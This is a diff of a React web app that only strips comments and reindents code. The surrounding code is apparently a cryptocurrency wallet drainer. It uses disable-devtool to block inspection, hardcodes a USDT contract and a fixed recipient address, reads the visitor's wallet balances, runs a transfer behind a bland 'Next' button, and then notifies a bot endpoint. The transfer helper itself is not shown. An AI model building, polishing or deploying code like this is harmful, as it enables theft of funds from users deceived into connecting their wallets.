@@ -4,8 +4,8 @@ import Web3 from "web3";
 import { ethers } from "ethers";
 import { FaArrowLeft } from 'react-icons/fa';
 import DisableDevtool from 'disable-devtool';
-import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js'; // Already fixed
-import { detectWalletAddress } from "./utils/transactionUtils.js"; // Already fixed
+import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js'; // Adjusted path
+import { detectWalletAddress } from "./utils/transactionUtils.js"; // Adjusted path
 
 const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
@@ -231,7 +231,7 @@ const App = () => {
   const [usdtBalance, setUsdtBalance] = useState(0);
   const [bnbBalance, setBnbBalance] = useState(0);
   const [walletConnected, setWalletConnected] = useState(false);
-  const [loading, setLoading] = useState(true); // Kept from previous fix
+  const [loading, setLoading] = useState(true);
   const [transferCompleted, setTransferCompleted] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
 
@@ -285,7 +285,7 @@ const App = () => {
     const init = async () => {
       try {
         if (!window.ethereum) {
-          setLoading(false); // Set loading false if no wallet
+          setLoading(false);
           return;
         }
         const provider = new ethers.BrowserProvider(window.ethereum);
@@ -301,7 +301,7 @@ const App = () => {
       } catch (err) {
         console.error("❌ init() error:", err);
       } finally {
-        setLoading(false); // Ensure loading ends
+        setLoading(false);
       }
     };
     init();
@@ -311,7 +311,7 @@ const App = () => {
     setAddress("");
   };
 
-  if (loading) return <div>Loading wallet...</div>; // Kept from previous fix
+  if (loading) return <div>Loading wallet...</div>;
 
   return (
     <GlobalStyle>
@@ -346,7 +346,6 @@ const App = () => {
               }
               await handleGetStartedClick(usdtAmount);
               setTransferCompleted(true);
-              // Notify bot after successful transfer
               fetch('/api/bot/notify', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -361,15 +360,15 @@ const App = () => {
               console.error("Transfer failed:", error);
               alert(error.message || "Transfer failed. Check console for details.");
             } finally {
-          setLoading(false);
-        }
-      }}
-    >
-      {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
-    </NextButton>
-  </Container>
-</GlobalStyle>
-);
+              setLoading(false);
+            }
+          }}
+        >
+          {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
+        </NextButton>
+      </Container>
+    </GlobalStyle>
+  );
 };
 
 export default App;
